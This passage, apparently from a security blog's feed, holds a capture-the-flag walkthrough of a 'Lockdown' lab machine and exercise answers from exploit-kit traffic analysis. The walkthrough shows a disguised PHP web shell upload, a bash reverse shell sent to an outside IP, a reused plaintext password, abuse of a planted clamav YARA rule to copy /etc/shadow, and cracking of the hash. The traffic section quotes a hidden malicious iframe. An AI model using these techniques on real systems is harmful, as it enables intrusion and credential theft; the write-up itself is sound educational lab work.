+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After the file is ready, we upload it onto the target server (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?page=system_info&lt;/code&gt;) → click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Update&lt;/code&gt; …&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/lockdown/2.png&quot; title=&quot;lockdown/2.png&quot; alt=&quot;lockdown/2.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Intercept the traffic with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp&lt;/code&gt; → modify the file type as below.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/lockdown/3.png&quot; title=&quot;lockdown/3.png&quot; alt=&quot;lockdown/3.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Forward&lt;/code&gt; the traffic.&lt;/p&gt;
+
+&lt;p&gt;Once the file is successfully uploaded, we logout and go to the URL: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://contacttracer.thm/login.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Open web developer tool (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + Shift + I&lt;/code&gt;) → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Network&lt;/code&gt; tab → we should see the &lt;em&gt;location of the PHP file we have uploaded&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/lockdown/4.png&quot; title=&quot;lockdown/4.png&quot; alt=&quot;lockdown/4.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Let us try to trigger the shell with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://contacttracer.thm/uploads/1633297860_test.png.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; -                                                                                              23 ⨯
+PNG
+
+IHDPN   pHYs
+
+            tIME&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;EXtCommentCreated with The GIMPd%eIDATxKL]@܌DF.F&amp;amp;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;B1ոQ&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;+BJ
+www-data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and we have code execution!.&lt;/p&gt;
+
+&lt;p&gt;Now, it is easy to pull a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://contacttracer.thm/uploads/1633297860_test.png.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.4.1.61%2F80+0%3E%261%22
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80                     
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.4.1.61] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.139.26] 54572
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1046&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+www-data@lockdown:/var/www/html/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;h4 id=&quot;shell-as-cyrus&quot;&gt;&lt;strong&gt;Shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt;&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;Enumerating the system divulges a plaintext password stored in a config file.&lt;/p&gt;
+
+&lt;p&gt;Combine the password with each system user, we discover &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sweetpandemonium&lt;/code&gt; let us in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@lockdown:/var/www/html/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su cyrus
+Password: sweetpandemonium
+cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt; shell, we can execute the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cyrus: 
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cyrus on lockdown:
+    env_reset, mail_badpass,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User cyrus may run the following commands on lockdown:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /opt/scan/scan.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;system-compromised&quot;&gt;&lt;strong&gt;System compromised&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;After conducting a few investigations, we realized that the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/clamav/&lt;/code&gt; is world-writable, which is also where the rules for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clamav&lt;/code&gt; are defined.&lt;/p&gt;
+
+&lt;p&gt;Our goal is writting a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YARA&lt;/code&gt; rule to flag the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file as malicious, the file is then copied to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/quarantine&lt;/code&gt; directory and is only accessible by us.&lt;/p&gt;
+
+&lt;p&gt;To do that, we first prepare a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yara&lt;/code&gt; rule:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/lib/clamav/root.yara 
+rule root_txt
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        strings:
+                &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;www-data:*:&quot;&lt;/span&gt;
+        condition:
+                &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basically, the rule will look for any file with the content &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data:*:&lt;/code&gt; and mark it as malicious.&lt;/p&gt;
+
+&lt;p&gt;Once we trigger the rule …&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /opt/scan/scan.sh                                                        
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cyrus: 
+Enter path: /etc   
+/etc/ld.so.cache: OK                        
+/etc/manpath.config: OK
+/etc/rsyslog.conf: OK
+...
+&lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt; SCAN SUMMARY &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+Known viruses: 2
+Engine version: 0.103.2
+Scanned directories: 1
+Scanned files: 83
+Infected files: 4
+Data scanned: 0.23 MB
+Data &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;: 0.12 MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ratio 1.97:1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Time: 0.080 sec &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 m 0 s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Start Date: 2021:10:04 01:04:25
+End Date:   2021:10:04 01:04:25
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file is copied to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/quarantine/shadow&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Here is the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shadow&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;quarantine/shadow
+...
+maxine:&lt;span class=&quot;nv&quot;&gt;$6$/&lt;/span&gt;syu6s6/&lt;span class=&quot;nv&quot;&gt;$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm&lt;/span&gt;/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320:18838:0:99999:7:::
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can crack the hash locally employed tools called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshadow&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unshadow maxine_passwd maxine_shadow &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; maxine_pass 
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt maxine_pass
+Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sha512crypt, crypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$6$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA512 256/256 AVX2 4x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 5000 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
+Will run 4 OpenMP threads
+Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+tiarna           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;maxine&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:17 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-10-03 21:10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.05767g/s 4665p/s 4665c/s 4665C/s 070196..skyline123
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With the cracked password, we can access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxine&lt;/code&gt; shell and run any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;!.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su maxine
+Password: tiarna
+maxine@lockdown:/home/cyrus&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su -
+root@lockdown:~# &lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="web" /><category term="linux" /><category term="offensive" /><summary type="html">Summary We will retain the intial access by abusing the SQL injection vulnerability to bypass authentication and upload a PHP reverse shell. Enumerating the target system locally, we discover that cyrus user reuses the password stored in a config file, which we will use to compromise cyrus shell access. Finally, privilege escalation can be achieved via injecting clamscan’s rules.</summary></entry><entry><title type="html">2015/06/30 - Traffic Analysis</title><link href="https://jayngng.github.io/blog/20150630-traffic-analysis/" rel="alternate" type="text/html" title="2015/06/30 - Traffic Analysis" /><published>2021-09-29T04:12:43+10:00</published><updated>2021-09-29T04:12:43+10:00</updated><id>https://jayngng.github.io/blog/20150630---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/20150630-traffic-analysis/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;You’re working as an analyst at your organization’s Security Operations Center (SOC).  One of the other analysts was investigating alerts on a Windows host, and the computer is infected.  That analyst retrieved a pcap of network traffic from the associated IP address.&lt;/p&gt;
+
+&lt;p&gt;You’ve been asked to review the pcap and answer the following questions:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;ol&gt;
+    &lt;li&gt;What is the compromised website? &lt;br /&gt;&lt;/li&gt;
+    &lt;li&gt;What is the exploit kit (EK) domain and IP address? &lt;br /&gt;&lt;/li&gt;
+    &lt;li&gt;What is the redirect URL generated by the compromised website that leads to the exploit kit? &lt;br /&gt;&lt;/li&gt;
+    &lt;li&gt;What is the post-infection traffic generated by the infected computer (in the pcap)? &lt;br /&gt;&lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Link to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt;: &lt;a href=&quot;https://www.malware-traffic-analysis.net/2015/06/30/2015-06-30-traffic-analysis-exercise.pcap.zip&quot;&gt;here&lt;/a&gt;. (Password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Credit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware-traffic-analysis.net&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;[1]. What is the compromised website?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;If we check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 13&lt;/code&gt;, a chain of infection starts from here.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.floridablueline.com&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150630/1.png&quot; title=&quot;20150630/1.png&quot; alt=&quot;20150630/1.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;[2]. What is the exploit kit (EK) domain and IP address?&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Domain: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;good.recycle2learn.com&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;46.30.45.65&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Here is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rig EK&lt;/code&gt; exposed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Suricata&lt;/code&gt; rules.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150630/2.png&quot; title=&quot;20150630/2.png&quot; alt=&quot;20150630/2.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;[3]. What is the redirect URL generated by the compromised website that leads to the exploit kit?&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;URL: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://www.fernandatur.com/Scripts/hqnybx2w.php?id=960135&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Here is a piece of code that redirected the victim to land on the EK site.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;document.write(&apos;&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://good.recycle2learn.com/?xniKfredLBvKDIU=l3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioXW_RGJN1hM-5DAFrE92lyjx-cUIsN2wR7QumAGzO0ZUEgbrA&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;left: -999px;top: -999px;position: absolute;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;202&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;202&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;&apos;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;[4]. What is the post-infection traffic generated by the infected computer (in the pcap)?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Starting from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 18&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 25&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;The victime sent requests to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fpdownload2.macromedia.com&lt;/code&gt; and download a large. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fpdownload2.macromedia.com&lt;/code&gt; site is known for possibly delivering a trojan.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150630/3.png&quot; title=&quot;20150630/3.png&quot; alt=&quot;20150630/3.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Some abnormal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetBIOS&lt;/code&gt; traffic are generated to the external IP.&lt;/li&gt;
+  &lt;li&gt;Search string: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;udp&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Here is the result.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150630/4.png&quot; title=&quot;20150630/4.png&quot; alt=&quot;20150630/4.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;We can safely conclude that a chain of infection occured as the victim landed on a compromised site, he was then exploited by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rig EK&lt;/code&gt;.&lt;/p&gt;</content><author><name></name></author><category term="ek" /><category term="blueteam" /><category term="traffic_analysis" /><summary type="html">Description You’re working as an analyst at your organization’s Security Operations Center (SOC).  One of the other analysts was investigating alerts on a Windows host, and the computer is infected.  That analyst retrieved a pcap of network traffic from the associated IP address.</summary></entry><entry><title type="html">2015 06 30 - Traffic Analysis</title><link href="https://jayngng.github.io/blog/2015-06-30-traffic-analysis/" rel="alternate" type="text/html" title="2015 06 30 - Traffic Analysis" /><published>2021-09-29T04:00:46+10:00</published><updated>2021-09-29T04:00:46+10:00</updated><id>https://jayngng.github.io/blog/2015-06-30---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/2015-06-30-traffic-analysis/"></content><author><name></name></author><category term="ek" /><category term="blueteam" /><category term="traffic_analysis" /><summary type="html"></summary></entry><entry><title type="html">Magnitude EK II- Traffic Analysis</title><link href="https://jayngng.github.io/blog/magnitude-ek-traffic-analysis/" rel="alternate" type="text/html" title="Magnitude EK II- Traffic Analysis" /><published>2021-09-26T19:24:17+10:00</published><updated>2021-09-26T19:24:17+10:00</updated><id>https://jayngng.github.io/blog/magnitude-ek---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/magnitude-ek-traffic-analysis/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;Analyze the following packet and answer the questions.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Link to download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt;: &lt;a href=&quot;https://www.malware-traffic-analysis.net/2015/01/18/2015-01-18-traffic-analysis-exercise-2-of-2.pcap.zip&quot;&gt;here&lt;/a&gt;.
+(Password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Credit&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware-traffic-analysis.net&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;question&quot;&gt;&lt;strong&gt;Question&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;For each pcap, answer the following questions:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;1) What is the date and time of the activity? &lt;br /&gt;
+2) What is the IP address of the Windows host that gets infected?&lt;br /&gt;
+3) What is the domain name and IP address of the compromised web site?&lt;br /&gt;
+4) What is the domain name and IP address that delivered the exploit kit (EK)?&lt;br /&gt;
+5) What is the name of the EK?&lt;/p&gt;
+&lt;/blockquote&gt;
+
